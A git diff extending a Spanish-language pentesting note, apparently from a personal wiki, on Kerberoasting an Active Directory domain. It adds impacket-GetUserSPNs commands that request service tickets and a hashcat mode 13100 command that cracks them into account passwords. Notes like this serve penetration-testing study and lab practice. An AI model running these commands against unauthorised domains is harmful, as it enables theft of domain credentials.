@@ -30,4 +30,23 @@ Recopilaremos una lista de las `SPN` del dominio para posteriormente poder extra
 impacket-GetUserSPNs -dc-ip <IP> <nombre.dominio>/user
 ```
 
-Obtendremos una lista de los `SPN` ahora para obtener los tickets de est
+Obtendremos una lista de los `SPN` ahora para obtener los tickets de estos usaremos [[IMPACKET]]
+
+```shell
+impacket-GetUserSPNs -dc-ip <IP> <nombre.dominio>/user -request
+```
+
+En el caso de que queramos que el comando nos devuelva solo el contenido de una cuenta usaremos la opción `-request-user <user>`
+
+También podemos facilitar el trabajo extrayendo los tickets en un archivo añadiendo la opción      `-outputfile <nombreFichero>`
+
+## Crackeo del ticket
+ Una vez tenemos los tickets en nuestro fichero lo que podemos hacer es descifrarlos usando [[HASHCAT]] 
+ 
+ ```shell
+hashcat -m 13100 <hashes> /ruta/a/wordlist
+ ```
+
+Nos dara las contraseñas
+
+## Validación de credenciales
